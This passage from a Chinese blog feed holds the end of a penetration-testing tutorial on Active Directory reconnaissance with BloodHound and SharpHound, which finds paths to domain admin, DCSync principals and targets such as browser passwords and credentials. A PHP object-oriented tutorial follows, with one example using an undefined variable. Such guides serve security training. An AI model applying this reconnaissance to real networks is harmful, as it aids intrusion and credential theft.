href="https://neo4j.com/download-center/#releases">https://neo4j.com/download-center/#releases</a></p><h3 id="3、启动Neo4j数据库服务端"><a href="#3、启动Neo4j数据库服务端" class="headerlink" title="3、启动Neo4j数据库服务端"></a>3、启动Neo4j数据库服务端</h3><p>下载好后，进入对应的目录在命令行运行如下命令启动（必须安装JDK环境才可以）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd C:\neo4j-community-3.5.3\bin\</span><br><span class="line">neo4j.bat console</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1717.png" alt="图片"></p><p>通过浏览器打开：<a href="http://localhost:7474/">http://localhost:7474/</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1718.png" alt="图片"></p><p>打开后设置一下密码：原密码neo4j，修改为：123456（任意）</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1719.png" alt="图片"></p><h3 id="4、下载BloodHound"><a href="#4、下载BloodHound" class="headerlink" title="4、下载BloodHound"></a>4、下载BloodHound</h3><p>下载地址：<a href="https://github.com/BloodHoundAD/BloodHound/releases">https://github.com/BloodHoundAD/BloodHound/releases</a></p><p>然后打开：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1720.png" alt="图片"></p><p>输入账号密码：eno4j、123456</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1721.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1722.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查找所有域管理员。 </span><br><span class="line">寻找到达域管理员的最短路径。 </span><br><span class="line">查找具有 dcsync权限的主体。 </span><br><span class="line">具有外部域组成员身份的用户。</span><br><span class="line">具有外部域组成员身份的组。 </span><br><span class="line">映射域信任。 </span><br><span class="line">无约束委托系统的最短路径。 </span><br><span class="line">从 KerberoAstable 用户获得的最短路径。</span><br><span class="line">从 KerberoAstable 用户到域管理员的最短路径。</span><br><span class="line">拥有主体的最短路径。 </span><br><span class="line">从所属主体到域管理员的最短路径。</span><br><span class="line">高价值目标的最短路径。 </span><br></pre></td></tr></table></figure><p>再下载：<a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe">https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe</a></p><p>放到C盘下：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1723.png" alt="图片"></p><p>然后运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe -c all</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1724.png" alt="图片"></p><p>运行完后会在当前路径下生成一个文件：20200323210837_BloodHound.zip</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1725.png" alt="图片"></p><p>然后我们吧他拖进去上传：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1726.png" alt="图片"></p><p>这个时候就有数据了：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1727.png" alt="图片"></p><h3 id="查找所有域管理员"><a href="#查找所有域管理员" class="headerlink" title="查找所有域管理员"></a>查找所有域管理员</h3><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1728.png" alt="图片"></p><h3 id="寻找最短到达域管理员的路径"><a href="#寻找最短到达域管理员的路径" class="headerlink" title="寻找最短到达域管理员的路径"></a>寻找最短到达域管理员的路径</h3><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1729.png" alt="图片"></p><h3 id="查找具有-dcsync权限的主体"><a href="#查找具有-dcsync权限的主体" class="headerlink" title="查找具有 dcsync权限的主体"></a>查找具有 dcsync权限的主体</h3><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1730.png" alt="图片"></p><h3 id="查看指定用户与域关联的详细信息"><a href="#查看指定用户与域关联的详细信息" class="headerlink" title="查看指定用户与域关联的详细信息"></a>查看指定用户与域关联的详细信息</h3><p>点一下用户就会在左边显示：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1731.png" alt="图片"></p><p>参考文章：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/sectool/179002.html</span><br><span class="line">https://www.cnblogs.com/KevinGeorge/p/10513211.html</span><br><span class="line">https://www.cnblogs.com/backlion/p/10643132.html</span><br></pre></td></tr></table></figure><h2 id="2-15-敏感数据防护"><a href="#2-15-敏感数据防护" class="headerlink" title="2.15 敏感数据防护"></a>2.15 敏感数据防护</h2><p>内网核心敏感数据，不仅仅包括数据库、电子邮件。还包括个人数据及组织的业务数据…可以说，价值高的数据基本上都在内网中，所以要了解攻击者的操作流程，这会对内网数据安全防护工作至关重要。</p><h3 id="1：资料、数据、文件的定位流程"><a href="#1：资料、数据、文件的定位流程" class="headerlink" title="1：资料、数据、文件的定位流程"></a>1：资料、数据、文件的定位流程</h3><p>内网数据防护的第一步，就是要熟悉攻击者获取数据的流程。在实际的网络环境中，攻击者主要通过各种恶意方法来定位公司内部各相关人员的机器。从而获取资料、数据、文件等重要信息。文件定位大致流程如下：</p><ul><li>定位内部人事组织结构</li><li>在内部人事组织结构中寻找需要监视的人员</li><li>定位相关人员的机器</li><li>监视相关人员存放文档的位置</li><li>列出存放文档的服务器的目录</li></ul><h3 id="2：重点核心业务机器及敏感信息防护"><a href="#2：重点核心业务机器及敏感信息防护" class="headerlink" title="2：重点核心业务机器及敏感信息防护"></a>2：重点核心业务机器及敏感信息防护</h3><p>重点核心业务机器是攻击者比较关心的机器，因此，我们需要对这些机器采取相应的安全防护措施。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1．核心业务机器</span><br><span class="line">高管/系统管理员/财务/人事/业务人员的个人计算机。 </span><br><span class="line">产品管理系统服务器（仓库管理系统） 。 </span><br><span class="line">OA 办公系统服务器。 </span><br><span class="line">财务应用系统服务器。 </span><br><span class="line">核心产品源码服务器（对于 IT公司，会架设自己的 SVN 或者 GIT 服务器） 。 </span><br><span class="line">数据库服务器。 </span><br><span class="line">文件服务器/共享服务器。</span><br><span class="line">邮件服务器。 </span><br><span class="line">网络监控系统服务器。 </span><br><span class="line">其他服务器（分公司、工厂）。 </span><br><span class="line"></span><br><span class="line">2．各类敏感文件信息 </span><br><span class="line">站点源码备份文件、数据库备份文件、配置文件备份等（后缀 XX.zip，XX.sql 等） 。 </span><br><span class="line">各类数据库的 Web 管理入口，如 phpmyadmin、adminer等。 </span><br><span class="line">浏览器密码和浏览器 cookie（IE、Chrome、Firefox） 。 </span><br><span class="line">其他用户会话、3389 和 ipc$连接记录、各用户回收站的信息等。 </span><br><span class="line">Windows 无线密码。 </span><br><span class="line">目标内部的各种账号和密码信息，包括邮箱、VPN、FTP、TeamView 等。 </span><br></pre></td></tr></table></figure><h3 id="3：应用于文件形式信息的防护"><a href="#3：应用于文件形式信息的防护" class="headerlink" title="3：应用于文件形式信息的防护"></a>3：应用于文件形式信息的防护</h3><p>总体来说，渗透测试人员对于这一步的工作，一是要了解已攻陷机器所属人员的职位（通常 一个高职位的人在内网中的权限比一般员工要高，在他的计算机内也会有很多重要的、敏感的个 人或公司内部文件），二是要在该机器中通过一些搜索命令来寻找自己所需要的资料。用户在内网 中工作时，建议不要将一些特别重要的资料放在公开的计算机中，必要时一定要对 Office 文档进 行加密，密码也不要太过于简单（对低版本的 Office 软件，如 Office 2003，在网上很容易找到一些破解软件进行破解；对高版本的 Office 软件，也可以通过微软 Sysinternals Suite 套件中的抓取 Dump 的工具 procdump 来获取密码） 。</p><h2 id="2-16-分析域内网段划分情况及拓扑图结构"><a href="#2-16-分析域内网段划分情况及拓扑图结构" class="headerlink" title="2.16 分析域内网段划分情况及拓扑图结构"></a>2.16 分析域内网段划分情况及拓扑图结构</h2><p>要养成一个习惯，在掌握了内网相关信息后，可以做一个拓扑图来帮助我们分析内网网络的分布情况。</p><h3 id="1：基本架构"><a href="#1：基本架构" class="headerlink" title="1：基本架构"></a>1：基本架构</h3><p>我们还需要对目标网站的基本情况进行简单的判断，分析目标服务器所使用的Web服务器、后端脚本、数据库、系统平台等。</p><ul><li>ASP + Access + IIS 5.0/6.0 + Windows Sever 2003 </li><li>ASPX + MSSQL + IIS 7.0/7.5 + Windows Sever 2008 </li><li>PHP + MySQL + IIS  </li><li>PHP + MySQL + Apache  </li><li>PHP + MySQL + Ngnix </li><li>JSP + MySQL + Ngnix  </li><li>JSP + MSSQL + Tomcat </li><li>JSP + Oracle + Tomcat </li></ul><h3 id="2：域内网划分"><a href="#2：域内网划分" class="headerlink" title="2：域内网划分"></a>2：域内网划分</h3><p>内网的环境判断，首先需要分析内网 IP 地址的分布情况。一般可以通过内网中的路由器、交 换机等设备，以及 SNMP、弱口令等，来获取内网网络拓扑或 DNS 域传送的信息。一般的大公司 都会有内部网站，渗透测试人员也可通过内部网站的公开链接找出部门的 IP 地址段。 内部网络是怎么划分的？是按照部门划分网段，按照楼层划分网段，还是按照地区划分网段？ 内网通常可分为 DMZ 区、办公区和核心区（生产区） 。了解整个内网的网络分布和组成，也有助 于渗透测试人员了解内网的核心业务。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1732.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1．DMZ 区 </span><br><span class="line">在实际的渗透测试中，大多数情况下，在外围 Web 中拿到的权限在 DMZ 区。这个区域不属 于严格意义上的内网。如果 DMZ 区域访问控制策略配置合理，DMZ 区会处在内网区能够访问 DMZ 区而 DMZ 区访问不了内网区的情况下，相关知识在第 1 章中已经详细讲解过，此处不再重 复。 </span><br><span class="line"></span><br><span class="line">2．办公区 </span><br><span class="line">办公区，顾名思义，是指公司员工日常的工作区。办公区的安全防护水平一般不是高，基本 防护机制大多为杀毒软件或主机入侵检测产品。在实际应用中，攻击者在获取权限后，利用内网 信任关系，很容易扩大攻击面。一般情况下，攻击者很少会直接到达办公区。攻击者如果想进入 办公区，可能会使用鱼叉攻击、水坑攻击或者社会工程学等手段。 办公区按照系统可分为 OA 系统、邮件系统、财务系统、文件共享系统、域控、企业版杀毒 系统、内部应用监控系统、运维管理系统等，按照网络段可分为域管理网段、内部服务器系统网 段、各部门分区网段等。 </span><br><span class="line"></span><br><span class="line">3．核心区 </span><br><span class="line">核心区一般存放企业最重要的数据、文档等信息资产，如域控制器、核心生产机器等，安全 设置也最为严格。根据目标开展的业务不同，相关服务器可能存在于不同的网段上。通过分析服 务器上运行的服务和进程，可以推断出目标主机使用的运维监控管理系统和安全防护系。在内网 中横向移动时，会优先查找这些主机。 核心区按照系统可分为业务系统、运维监控系统、安全系统等，按照网络段可分为各不同的 业务网段、运维监控网段、安全管理网段等。 </span><br></pre></td></tr></table></figure><p>通过获取的目标主机及所在域的各类信息，就可以绘制内网的拓扑结构图，在后续的渗透测 试中，对照拓扑图可以更快地了解目标域网内部环境，准确定位内网具体目标。</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
            <tag> 内网安全 </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> PowerShell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP面向对象OOP学习笔记</title>
      <link href="/2020/05/27/PHP-OOP/"/>
      <url>/2020/05/27/PHP-OOP/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=494858498&auto=1&height=66"></iframe><h1 id="面向对象基础"><a href="#面向对象基础" class="headerlink" title="面向对象基础"></a>面向对象基础</h1><blockquote><p>学习目标：理解面向对象编程思想，了解计算机编程语言的演变过程，掌握PHP面向对象的基础语法，使用面向对象编程思想和面向对象语法实现编程解决需求问题</p></blockquote><ul><li>计算机语言发展史</li><li>面向过程编程思想</li><li>面向对象编程思想</li><li>面向对象基础语法</li><li>综合运用</li></ul><blockquote><p><strong>概念</strong></p></blockquote><p><strong>编程语法发展史</strong>：计算机编程在历史的发展长河中，经历了多次<code>版本变革</code>，变化的轨迹是伴随着硬件的发展和人们对于计算机的认知以及需求。</p><ul><li><p>机器语言：即开发者（科学家）使用<code>0</code>和<code>1</code>组成命令，然后在特定计算机上执行</p><ul><li><p>优点：执行效率高</p></li><li><p>缺点：开发难度大、移植性差、开发成本高</p></li></ul></li><li><p>汇编语言：开发者使用简洁<code>英文字母</code>和<code>符号</code>组成，让计算机读取后根据符号进行加工执行</p><ul><li>优点：指令简单明了、推广性高</li><li>缺点：移植性差、功能简单</li></ul></li><li><p>高级计算机语言：开发者使用类似自然语言的<code>符号</code>组成，高级语言根据编程思想分为<code>面向过程编程</code>和<code>面向对象编程</code>两种，然后系统对程序代码进行编译（需要第三方编译器）然后执行</p><ul><li>优点：移植性强、可读性强、推广性非常高</li><li>缺点：执行效率降低</li></ul></li></ul><p><strong>面向过程编程</strong></p><ul><li>将要解决的问题（功能需求）分解成具体的步骤，然后通过<strong>函数编程</strong>实现每一个步骤，最后通过函数规定好的顺序调用完成</li><li>面向过程编程思想的优点<ul><li>能够针对步骤拆分，进行模块化封装（函数）</li><li>可以实现代码复用，从而节省开发成本</li></ul></li><li>面向过程编程思想的缺点<ul><li>不够灵活维护，流程一旦确定就必须按照既定方式执行到底。</li></ul></li></ul><blockquote><p><strong>小结</strong></p></blockquote><p>1、计算机编程从对开发人员要求极高到要求不高，是一代代人坚持不懈的结果</p><p>2、面向对象编程是目前最为符合人类思维逻辑的一种编程思想</p><h2 id="一、面向对象编程思想"><a href="#一、面向对象编程思想" class="headerlink" title="一、面向对象编程思想"></a>一、面向对象编程思想</h2><blockquote><p>目标：理解面向对象编程思想与面向过程编程思想的区别，了解面向对象编程思想的核心，建立面向对象编程思想</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>面向对象编程思想</strong>：面向对象编程也叫做OOP编程（Objected Oriented Programming），是一种基于面向过程的开发思想。与面向过程强调分解事务步骤相似，面向对象更需要追求事务操作的“主体”，也就是<code>对象</code></p><ul><li><p>面向对象编程是一种编程思想，不是一种具体技术</p></li><li><p>面向对象是在面向过程基础之上发展而来，因此也是一种模块化编程思想（有函数）</p></li><li><p>面向对象能够更加方便的实现代码的重复利用（适用于大型项目）</p></li><li><p>在面向对象思维中，任何动作的执行或者数据都属于对象（一切皆对象）</p></li></ul><blockquote><p>原理</p></blockquote><p>1、面向过程编程思想原理</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/%E6%95%88%E6%9E%9C%E5%9B%BE/%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3%E5%8E%9F%E7%90%86.gif" alt="面向过程编程思想原理"></p><p>2、面向对象编程思想原理</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/%E6%95%88%E6%9E%9C%E5%9B%BE/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3%E5%8E%9F%E7%90%86.gif" alt="面向对象编程思想原理"></p><blockquote><p><strong>小结</strong></p></blockquote><ol><li>面向对象编程是一种编程思想，与技术无关</li><li>面向对象编程的本质是增加数据和功能的操作主体，即对象</li><li>面向对象中所有的数据和功能都是由主体（对象）来调用和操作</li></ol><h2 id="二、面向对象基础"><a href="#二、面向对象基础" class="headerlink" title="二、面向对象基础"></a><strong>二、面向对象基础</strong></h2><blockquote><p>学习目标：掌握面向对象的基础语法，能够使用面向对象思想和语法来解决需求问题</p></blockquote><ul><li>面向对象关键字</li><li>类的定义、实例化和对象</li><li>类成员</li><li>访问修饰限定符</li><li>内部对象$this</li><li>面向对象开发规范</li><li>魔术方法</li><li>成员访问</li><li>静态成员</li><li>自动加载</li><li>克隆</li><li>综合运用</li></ul><blockquote><p>示例</p></blockquote><p>1、面向过程的方式实现一个功能：购买商品</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义函数购买商品</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"><span class="variable">$goods_id</span>,<span class="variable">$num</span> = <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;商品：&#x27;</span> . <span class="variable">$goods_id</span> . <span class="string">&#x27;购买：&#x27;</span> . <span class="variable">$num</span> . <span class="string">&#x27;个！&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用解决</span></span><br><span class="line">buy(<span class="number">1</span>,<span class="number">10</span>);<span class="comment"># 输出： 商品：1购买10个</span></span><br></pre></td></tr></table></figure><p>2、面向对象的方式实现一个功能：购买商品</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 确定是消费者购买（类）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Buyer</span></span>&#123;</span><br><span class="line">    <span class="comment"># 拥有购买功能（方法）</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"><span class="variable">$id</span>,<span class="variable">$num</span> = <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;商品：&#x27;</span> . <span class="variable">$goods_id</span> . <span class="string">&#x27;购买：&#x27;</span> . <span class="variable">$num</span> . <span class="string">&#x27;个！&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确定具体买家购买</span></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Buyer();<span class="comment"># 产生具体买家（对象）</span></span><br><span class="line"><span class="variable">$b</span>-&gt;buy(<span class="number">1</span>,<span class="number">10</span>);<span class="comment"># 输出： 商品：1购买10个</span></span><br></pre></td></tr></table></figure><blockquote><p>小结</p></blockquote><p>1、面向对象是一种编程思想，编程语言要实现这种编程思想就会有一些相应的语法格式出现</p><p>2、使用面向对象语法格式实现的功能才属于面向对象编程（OOP）</p><h3 id="1、面向对象关键字说明"><a href="#1、面向对象关键字说明" class="headerlink" title="1、面向对象关键字说明"></a><strong>1、面向对象关键字说明</strong></h3><blockquote><p>目标：了解面向对象编程中一些关键字的意义</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>面向对象关键字</strong>：基于面向对象开发时，所用到的一些关键字，用来表明不同的结构或者类型</p><ul><li><p>类：class，是定义面向对象主体的最外层结构，用来包裹主体的数据和功能（函数）。类是一类具有共性事务的代表，代表的是事务的共性。</p></li><li><p>对象：object，是某类事务的具体代表，也是实际数据和功能操作的具体单元，也被称之为实例（instance）</p></li><li><p>实例化：new，从一个抽象的概念得到一个符合抽象概念的具体实例的过程</p></li><li><p>类成员：member，指类class结构中的所有内容，类成员里有三种</p><ul><li>方法：method，本质是在类class结构中创建的函数，也称之为<code>成员方法</code>或者成员函数</li><li>属性：property，本质是在类class结构中创建的变量，也称之为<code>成员变量</code></li><li>类常量：const，本质是在类class结构中创建的常量</li></ul></li></ul><blockquote><p>小结</p></blockquote><p>1、因为面向对象思想的出现，会多出一些结构语法关键字</p><p>2、了解关键字的作用后，才能更灵活的应用关键字实现面向对象编程</p><h3 id="2、面向对象简单技术实现"><a href="#2、面向对象简单技术实现" class="headerlink" title="2、面向对象简单技术实现"></a><strong>2、面向对象简单技术实现</strong></h3><blockquote><p>目标：掌握类、对象和实例化之间的关系</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>类</strong>：根据对象分析后得到的一种通用结构（分类）</p><ul><li>class关键字声明类</li><li>类名：自定义名字，通常首字母大写，一般多单词组成类使用驼峰法（大驼峰法）</li><li>大括号：类内部的结构（member，类成员）</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>实例化：类产生对象的过程</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> 类名;</span><br><span class="line"><span class="keyword">new</span> 类名();<span class="comment"># 使用较多</span></span><br></pre></td></tr></table></figure><ul><li>对象：根据类产生的某个具体存在的实体（instance），对象一般使用变量保存</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> 类名();</span><br></pre></td></tr></table></figure><blockquote><p>步骤</p></blockquote><p>1、根据需求产生类结构（class）</p><ul><li>分析类拥有的数据</li><li>分析类的行为</li></ul><p>2、在需要使用对象的地方，对类进行实例化（new），并保存对象</p><blockquote><p>示例</p></blockquote><p>1、定义类基本语法：class 类名{}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义一个空类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nothing</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、类实例化产生对象：new</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实例化，并将产生的对象保存在变量中</span></span><br><span class="line"><span class="variable">$n</span> = <span class="keyword">new</span> Nothing();</span><br><span class="line"><span class="comment"># 打印对象</span></span><br><span class="line">var_dump(<span class="variable">$n</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印结果分析</span></span><br><span class="line"><span class="keyword">object</span>(Nothing)<span class="comment">#1 (0) &#123; &#125; </span></span><br><span class="line"><span class="keyword">object</span>：对象</span><br><span class="line">(Nothing)：所属类名 </span><br><span class="line"><span class="comment">#1：对象编号，与类无关，是整个脚本中对象的序号，从1开始</span></span><br><span class="line">(<span class="number">0</span>)：成员变量（属性）个数   </span><br><span class="line">&#123;&#125;：具体成员变量信息（键值对）</span><br></pre></td></tr></table></figure><p>3、类class是一种结构，如果写好没有语法错误的情况下，代码不会执行（与函数定义一样），也无法打印输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接打印类名</span></span><br><span class="line">var_dump(Nothing);<span class="comment"># 错误，提示未定义的常量</span></span><br></pre></td></tr></table></figure><p>4、类的命名规范：类的命名规范与函数类似，区别在于人为的通常会将类名的首字母大写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 有效类名</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">My1</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">My_1</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_My1</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 无效类名</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> 1<span class="title">My</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> 1<span class="title">_my</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>5、如果碰到多单词组成的类名，通常使用驼峰法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>小结</strong></p></blockquote><ol><li>通过class关键字 + 类名 +{}创建类</li><li>类是一种结构，不会自动运行，也不能输出</li><li>通过new 类名实例化对象得到类的具体对象</li><li>可以通过new实例化无限个对象</li></ol><h3 id="3、类成员"><a href="#3、类成员" class="headerlink" title="3、类成员"></a><strong>3、类成员</strong></h3><blockquote><p>目标：了解类成员的类型，类成员的作用，能够运用类成员去创建有效类</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>类成员</strong>：指<strong>直接定义</strong>在类结构{}内部的一级成员，即直接依赖{}的成员</p><ul><li>类成员分类<ul><li>成员变量（属性）：给对象存储数据的变量</li><li>成员函数（方法）：给对象调用解决问题的函数</li><li>类常量：属于类内部的常量，使用const关键字定义</li></ul></li><li>属性和方法需要使用<strong>访问修饰限定符修饰</strong>，姑且使用public修饰</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">    <span class="comment"># 类常量（可以多个）</span></span><br><span class="line">    <span class="keyword">const</span> 常量名 = 值;</span><br><span class="line">    <span class="comment"># 属性（可以多个）</span></span><br><span class="line">    <span class="keyword">public</span> $属性名 [ = 值];<span class="comment"># 可以赋值也可以不赋值，只声明</span></span><br><span class="line">    <span class="comment"># 方法（可以多个）</span></span><br><span class="line">    [<span class="keyword">public</span>] <span class="function"><span class="keyword">function</span> 方法名(<span class="params">[形参列表]</span>)</span>&#123;</span><br><span class="line">        <span class="comment"># 方法体（返回值）</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>成员访问：属性和方法都属于对象访问，类常量属于类访问（后续再讲）<ul><li>对象访问属性和方法，使用<code>-&gt;</code></li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实例化</span></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> 类名();</span><br><span class="line"><span class="comment"># 属性访问</span></span><br><span class="line"><span class="variable">$object</span>-&gt;属性名;<span class="comment"># 此时不带属性本身的$符号（前面保存对象的变量带$符号，object-&gt;属性名是整体）</span></span><br><span class="line"><span class="comment"># 方法访问</span></span><br><span class="line"><span class="variable">$object</span>-&gt;方法名([实参列表]);</span><br></pre></td></tr></table></figure><blockquote><p>步骤</p></blockquote><p>1、声明类结构</p><p>2、明确类产生的对象是否需要有数据的存储：确定属性</p><p>3、明确类产生的对象是否需要函数实现功能：确定方法</p><p>4、明确类是否需要定义常量：确定类常量</p><p>5、对象实例化</p><p>6、类成员访问（属性和方法）</p><blockquote><p>示例</p></blockquote><p>1、声明类结构</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 